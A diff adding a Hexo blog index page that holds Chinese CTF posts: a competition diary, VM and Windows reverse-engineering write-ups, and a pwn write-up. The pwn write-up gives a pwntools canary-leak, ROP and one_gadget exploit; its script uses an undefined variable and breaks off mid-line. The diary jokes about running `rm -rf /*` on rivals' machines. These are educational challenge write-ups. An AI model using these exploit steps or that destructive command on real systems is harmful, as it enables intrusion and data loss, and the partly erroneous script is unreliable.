@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-2019-06-24-third" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/06/24/2019-06-24-third/" class="article-date">
+  <time class="dt-published" datetime="2019-06-23T16:00:00.000Z" itemprop="datePublished">2019-06-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/06/24/2019-06-24-third/">大二参加国赛</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>简单记录一下这次难忘的一次沈阳之旅</p>
+<h2 id="难忘的周末"><a href="#难忘的周末" class="headerlink" title="难忘的周末"></a>难忘的周末</h2><p>我们是周五晚上到的，然后吃了点东西就睡了，准备第二天比赛。到了比赛现场感觉好草率的说，临时加了不少小事项，很迷（签到处小姐姐很漂亮），然后到了赛场（赛场分两个，我们是第二个赛场）</p>
+<p>本来比赛章程写着有一个可申请上网的电脑，结果临时变卦不能（很难受啊）</p>
+<p>它具体的比赛规则很迷，大致如下所述：</p>
+<p>上午的<strong>break</strong>和下午的<strong>fix</strong>，最后的成绩还要加上之前的出题，就是<strong>build</strong>，三项加权就是总成绩，其中题都是根据不同赛区选手之间互相出题，<strong>break</strong>很难玩，本菜鸡3个月之前入门pwn，漏洞点找到了但是不太会利用就很难受，而且不能上网。比赛一开始分配比赛账号，然后一个靶机，赛前我们不太清楚，还以为是awd那种，后来发现<strong>break</strong>就是打自己的端口，获取自己的flag，然后下午的<strong>fix</strong>是给你ssh账号密码，让你连自己的靶机，去“优雅”地修理自己漏洞点。嗯，这ssh密码怎么直接公告出来了，万一最后哪个队像搞你，<code>rm -rf /*</code>咋办（虽然我们也没敢试）？？</p>
+<p>这里想吐槽一下下午的fix阶段，我们一阵佛系<strong>fix</strong>，我打的pwn题一顿<strong>patch</strong>，主要是不知道怎么检测，不敢乱打，就用<strong>ida</strong>小改，感觉这算是个比赛赛程漏洞？毕竟不知道怎么算的分数，不是怀疑比赛的公平，主要是想看看具体的check脚本。</p>
+<p>两个阶段中间时间可以换队员，运维很吃香</p>
+<p>第二天上午多加了两个签到，队友手贼快拿了个一血，导致我们直接上到第二（好像吧，然后<strong>nex</strong>和<strong>lilac</strong>和我们学长<strong>Cruis</strong>开始了上分之路，把我们挤到了最后，比赛计分有点问题，我们直接到了倒数第二，后来发现是计分错了，大家和我们一样就是直解出来签到，还好。下午<strong>fix</strong>类似，都是佛系魔改。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这场比赛的题目安排很迷，第一天四个web四个pwn，外加一个mobile，第二天三个web，2个pwn，一个mobile，还有两个送分的签到，没有re和杂项了，可能也是为了下午的<strong>fix</strong>阶段必须打漏洞，这3个方向比较符合，不太像现在的国际大赛，重视二进制。第一天<strong>R web-I</strong>队直接打两个web题，太强了，直接干到第一了，所以原本以为得pwn题得天下，现在来看这比赛web狗重新站起来了，逆向手瞬间爆炸</p>
+<p>之前的比赛都是只能选两个队入围决赛，主要原因是一个学校一个队，现在分开了（我们学校半决赛进了两个队），能进6个队好像（我们第八，还是差点），明年再干</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/06/24/2019-06-24-third/" data-id="cuidMXrs8GKh9l6OMNip-_pE0" data-title="大二参加国赛" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chat/" rel="tag">chat</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-05-28-vm" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/05/28/2019-05-28-vm/" class="article-date">
+  <time class="dt-published" datetime="2019-05-27T16:00:00.000Z" itemprop="datePublished">2019-05-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/05/28/2019-05-28-vm/">VM</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="What-is-VM"><a href="#What-is-VM" class="headerlink" title="What is VM"></a>What is VM</h1><blockquote>
+<p>different from virtualbox…</p>
+</blockquote>
+<p>这种虚拟机类似于自己用一套自己定义的操作码实现了完整的逻辑，当然用的指令不太多，不然会很困难且效率很低，显得没有必要。必要的定义有</p>
+<ul>
+<li>虚拟机的初始化</li>
+<li>一套自己定义的操作码</li>
+<li>对应各个操作码的解释器</li>
+</ul>
+<p>初次接触也许很生疏，我们从一套题目看起，这是<strong>2018NCTF WcyVM</strong>，网上wp很多，我在这里通过这道题来详细说明一下虚拟机在逆向方面的各种思路</p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><blockquote>
+<p>Some differences</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  printf(&quot;This is a %s\nplz input your flag:&quot;, aWcyvm1);</span><br><span class="line">  if ( sub_400DAB() )</span><br><span class="line">    puts(&quot;flag is your input&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;didixingwei&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到主函数逻辑极其简单，我们跟<code>sub_400DAB()</code>，会发现是一个<code>while</code>嵌套<code>switch</code>的一套代码，先看循环以上本函数的初始化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  v1 = 0;</span><br><span class="line">  dest = malloc(0x200uLL);</span><br><span class="line">  v3 = malloc(0x1400uLL);</span><br><span class="line">  memset(&amp;v4, 0, 0x30uLL);</span><br><span class="line">  memcpy(dest, &amp;unk_6021C0, 0x190uLL);</span><br><span class="line">  v4 = malloc(0x38uLL);</span><br><span class="line">  v5 = v4 + 1;</span><br><span class="line">  v6 = v4 + 2;</span><br><span class="line">  v7 = v4 + 3;</span><br><span class="line">  v8 = v3 + 5120;</span><br><span class="line">  v9 = v3 + 5120;</span><br><span class="line">  v10 = dest;</span><br><span class="line">LABEL_26:</span><br></pre></td></tr></table></figure>
+
+<p>定义了许多变量，我们只需要注意<strong>v8</strong>即可，这是一个堆栈指针，在以后有大用，我们看一下后边的<code>case</code>指令，例如下方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> case 8:</span><br><span class="line">        sub_40082B((&amp;v4)[v10[1] - 1], v10[2], &amp;v10);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">//本函数</span><br><span class="line">_QWORD *__fastcall sub_40082B(_DWORD *a1, int a2, _QWORD *a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line"></span><br><span class="line">  *a1 = a2;</span><br><span class="line">  result = a3;</span><br><span class="line">  *result += 12LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看下这个函数，它做的便是把a2的值赋给了a1，然后把指针向后移，所以可以简单理解为<code>mov a1,a2</code>,而堆栈指针的使用在下边，我们举例说明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      case 9:</span><br><span class="line">        sub_40096D((&amp;v4)[v10[1] - 1], &amp;v8, &amp;v10);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">       </span><br><span class="line">_QWORD *__fastcall sub_40096D(_DWORD *a1, _DWORD **a2, _QWORD *a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line"></span><br><span class="line">  *a1 = **a2;</span><br><span class="line">  ++*a2;</span><br><span class="line">  result = a3;</span><br><span class="line">  *result += 8LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到函数在直接把a2的值给了a1，之后a2自增，之后与之前的函数类似，这显然就是一个典型的<code>pop a1</code>操作，而且v8正是我们是我们假定的栈顶指针</p>
+<p>这题就是这样需要一步一步逆出指令集即可进行解题，没有别的自动化方法，我们把我们要做的操作码用idc搞出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">auto i,start,end,num;</span><br><span class="line">start = 0x6021c0;</span><br><span class="line">end = 0x60234f;</span><br><span class="line">Message(&quot;\n---------\n&quot;);</span><br><span class="line">for(i=start;i&lt;end;i=i+4)</span><br><span class="line">&#123;</span><br><span class="line">    Message(&quot;%d,&quot;,Dword(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后硬着头皮，像转换一样把它填进去就行，例如根据得到的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8,1,0,8,3,70,14,21,10,1,9,2,11,10,1,10,2,9,1,17,1,13,1,3,15,8,8,1,0,8,3,71,14,70,10,1,26,2,6,29,1,4,20,2,1,25,1,2,27,1,1,29,1,110,19,1,99,21,1,116,19,1,102,28,2,1,9,1,17,1,13,1,3,15,34,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,</span><br></pre></td></tr></table></figure>
+
+<p><code>8,1,0</code>就是<code>mov (&amp;v4)[v10[1] - 1],0</code></p>
+<p><code>9，1</code>就是<code>pop (&amp;v4)[v10[1] - 1]</code></p>
+<p>很难受的题，不过这种逆向确实很有趣</p>
+<h2 id="正向出题"><a href="#正向出题" class="headerlink" title="正向出题"></a>正向出题</h2><p>下面自己完成一套虚拟机，通过正向来看一下 vm 层面需要什么</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/05/28/2019-05-28-vm/" data-id="cuidkrLhGBlveDdKeXSkP7AjG" data-title="VM" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-05-26-南宁杯Re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/05/26/2019-05-26-%E5%8D%97%E5%AE%81%E6%9D%AFRe/" class="article-date">
+  <time class="dt-published" datetime="2019-05-25T16:00:00.000Z" itemprop="datePublished">2019-05-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/05/26/2019-05-26-%E5%8D%97%E5%AE%81%E6%9D%AFRe/">远古时期</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h2><blockquote>
+<p>a windows reverse</p>
+</blockquote>
+<p>本程序有upx壳，拿工具直接脱掉，在做本程序时遇到了一些问题，在这里记录一下</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><blockquote>
+<p>Let’s see it</p>
+</blockquote>
+<p>其实本题就是麻烦，必须用好多flag碎片拼凑，我在第一处和第三处遇到了问题，直接贴出来，其中第三处的<strong>base64</strong>我愣是看不出来，最后通过peid小插件才发现是，（我真是。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(input) == 29 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( input[28] == 125 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = 0;</span><br><span class="line">      v4 = input;</span><br><span class="line">      v5 = 8;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( (*v4 ^ dword_40803C[&amp;v4[3 - input] % 8]) == v4[aMwwCTw - input] )</span><br><span class="line">          ++v7;</span><br><span class="line">        ++v4;</span><br><span class="line">        --v5;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v5 );</span><br><span class="line">      if ( v7 == 8 )</span><br><span class="line">        sub_401170(input);</span><br><span class="line">      else</span><br><span class="line">        sub_4012E0(aHereIsGxnnctf);</span><br><span class="line">      result = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4012E0(aUnlikeFlag);</span><br><span class="line">      result = 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>这个<strong>if</strong>语句贼奇怪，根本看不懂，后来动态调试的时候了然了，我们要做的便是让<code>v7</code>为8，这样必须让<strong>if</strong>全成立</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.data:0040803C word_40803C     dw 14h                  ; DATA XREF: _main+7B↑r</span><br><span class="line">.data:0040803E                 db    0</span><br><span class="line">.data:0040803F                 db    0</span><br><span class="line">.data:00408040                 dw 12h</span><br><span class="line">.data:00408042                 db    0</span><br><span class="line">.data:00408043                 db    0</span><br><span class="line">.data:00408044                 dw 0Ch</span><br><span class="line">.data:00408046                 db    0</span><br><span class="line">.data:00408047                 db    0</span><br><span class="line">.data:00408048                 dw 0Ah</span><br><span class="line">.data:0040804A                 db    0</span><br><span class="line">.data:0040804B                 db    0</span><br><span class="line">.data:0040804C                 dw 0Fh</span><br><span class="line">.data:0040804E                 db    0</span><br><span class="line">.data:0040804F                 db    0</span><br><span class="line">.data:00408050                 dw 19h</span><br><span class="line">.data:00408052                 db    0</span><br><span class="line">.data:00408053                 db    0</span><br><span class="line">.data:00408054                 dw 31h</span><br><span class="line">.data:00408056                 db    0</span><br><span class="line">.data:00408057                 db    0</span><br></pre></td></tr></table></figure>
+
+<p><code>dword_40803C</code>处的几个16进制数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.data:00408030 byte_408030     db 6Dh                  ; DATA XREF: _main+4E↑o</span><br><span class="line">.data:00408031                 db  77h ; w</span><br><span class="line">.data:00408032                 db  77h ; w</span><br><span class="line">.data:00408033                 db  5Fh ; _</span><br><span class="line">.data:00408034                 db  63h ; c</span><br><span class="line">.data:00408035                 db  60h ; `</span><br><span class="line">.data:00408036                 db  74h ; t</span><br><span class="line">.data:00408037                 db  77h ; w</span><br><span class="line">.data:00408038                 db    0</span><br><span class="line">.data:00408039                 align 4</span><br></pre></td></tr></table></figure>
+<p><code>byte_408030</code>处的字符</p>
+<p>我们直接动态跑一下，毕竟还搞不清为啥是<code>dword</code>，直接上od撸汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401268  |&gt; \0FBE28        |movsx ebp,byte ptr ds:[eax]</span><br><span class="line">0040126B  |.  8B1C9D 3C8040&gt;|mov ebx,dword ptr ds:[ebx*4+0x40803C]</span><br><span class="line">00401272  |.  33DD          |xor ebx,ebp</span><br><span class="line">00401274  |.  0FBE2C02      |movsx ebp,byte ptr ds:[edx+eax]</span><br><span class="line">00401278  |.  3BDD          |cmp ebx,ebp</span><br><span class="line">0040127A  |.  75 04         |jnz short SMC.00401280</span><br><span class="line">0040127C  |.  FF4424 10     |inc dword ptr ss:[esp+0x10]</span><br></pre></td></tr></table></figure>
+
+<p>关键代码如上，我们可以看到，在ebp处是我们的输入，程序把某些字符(<code>ds:[ebx*4+0x40803C]</code>)取出放入ebx中，然后两者异或又与某些数（<code>ds:[edx+eax]</code>）比较</p>
+<p>这么看直接每次按f8把得到的字符搞出来就行，但是我们看看ida到底是怎么想的（手动滑稽</p>
+<p>我不太清楚为什么ida把<code>dword_40803C</code>认成<strong>dw</strong>?应该是<strong>dd</strong>才对，很奇怪，还有发现它控制<code>%8</code>的时候思路很清奇，是利用与<code>0x80000007</code>进行and运算，感觉很强，所以我们何止直接导出来ida的值也可以跑</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><blockquote>
+<p>Assembly language is the best</p>
+</blockquote>
+<p>这几天通过看各种题终于发现汇编才是王道，真的不能太依赖ida了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/05/26/2019-05-26-%E5%8D%97%E5%AE%81%E6%9D%AFRe/" data-id="cuidC_c468WPtBe6KplBJmOpv" data-title="远古时期" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-05-24-jeasycanary" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/05/24/2019-05-24-jeasycanary/" class="article-date">
+  <time class="dt-published" datetime="2019-05-23T16:00:00.000Z" itemprop="datePublished">2019-05-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/05/24/2019-05-24-jeasycanary/">吉林网络安全省赛</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote>
+<p>Safeguard、operation and analysis</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop/pwn$ checksec easycanary</span><br><span class="line">[*] &#x27;/home/pic/Desktop/pwn/easycanary&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">pic@ubuntu:~/Desktop/pwn$ ./easycanary </span><br><span class="line">welcome any</span><br><span class="line">learn some canary challenge</span><br><span class="line">input your name</span><br><span class="line">1</span><br><span class="line">hello 1����</span><br><span class="line">Let&#x27;s start a game, can you guess the keyword?</span><br><span class="line">1</span><br><span class="line">fail</span><br></pre></td></tr></table></figure>
+
+<p>可以看到本题开了nx和canary，我们逻辑看了个大概，下面到<em>ida</em>中具体分析，主函数没啥看的，直接到<code>name()</code>函数中看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 name()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-30h]</span><br><span class="line">  char v2; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;input your name&quot;);</span><br><span class="line">  readi(&amp;v2, 24LL);</span><br><span class="line">  printf(&quot;hello %s\n&quot;, &amp;v2);</span><br><span class="line">  puts(&quot;Let&#x27;s start a game, can you guess the keyword?&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x90uLL);</span><br><span class="line">  if ( !strcmp(&amp;buf, keyword) )</span><br><span class="line">    puts(&quot;good boy\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;fail&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><blockquote>
+<p>how to exploit vulnerability</p>
+</blockquote>
+<p>可以看到两个溢出，一个泄露canary，一个直接上shellcode就行，所以思路如下：</p>
+<ul>
+<li>在<code>readi(&amp;v2, 24LL)</code>把’\x00’抹掉，从而泄露canary</li>
+<li>用<code>pop rdi</code>把puts真实地址找出来，从而算偏移</li>
+<li>利用<code>one_gadget</code>把<code>execve(&quot;/bin/sh&quot;)</code>找到</li>
+<li>然后再调用一遍<code>main()</code>函数直接起shell即可</li>
+</ul>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>本题要点就是canary，知道这个就很简单了,exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./easycanary&#x27;)</span><br><span class="line">elf = ELF(&#x27;./easycanary&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;input your name\n&#x27;)</span><br><span class="line">p.send(&#x27;A&#x27;*0x19)</span><br><span class="line">#当然用sendline(&#x27;A&#x27;*0x18)也行，相当于直接接了个&#x27;\n&#x27;</span><br><span class="line">p.recvuntil(&#x27;A&#x27;*0x18)</span><br><span class="line">canary = u64(p.recv(8))</span><br><span class="line">canary = canary - 0x41</span><br><span class="line">print hex(canary)</span><br><span class="line">p.recvuntil(&#x27;guess the keyword?\n&#x27;)</span><br><span class="line"></span><br><span class="line">payload = &#x27;qwertyuiopasdfghjklzxcvbnm&#x27; + &#x27;\x00&#x27;</span><br><span class="line">payload += &#x27;A&#x27;*(40-len(payload)) + p64(canary)</span><br><span class="line">payload += &#x27;A&#x27;*(56-len(payload)) +p64(0x400a53)+ p64(0x601018)+p64(0x400666)+ p64(0x4009AB)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;good boy\n\n&#x27;)</span><br><span class="line">puts_got = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = puts_got - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">payload2 = libc_base + 0x45216</span><br><span class="line">print hex(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27; your name\n&#x27;)</span><br><span class="line">p.send(&#x27;A&#x27;*0x19)</span><br><span class="line">p.recvuntil(&#x27;A&#x27;*0x18)</span><br><span class="line">canary = u64(p.recv(8))</span><br><span class="line">canary = data3 - 0x41</span><br><span class="line">print hex(canary)</span><br><span class="line">p.recvuntil(&#x27;guess the keyword?\n&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = &#x27;qwertyuiopasdfghjklzxcvbnm&#x27; + &#x27;\x00&#x27;</span><br><span class="line">payload2 += &#x27;A&#x27;*(40-len(payload2)) + p64(canary)</span><br><span class="line">payload2 += &#x27;A&#x27;*(56-len(payload2)) 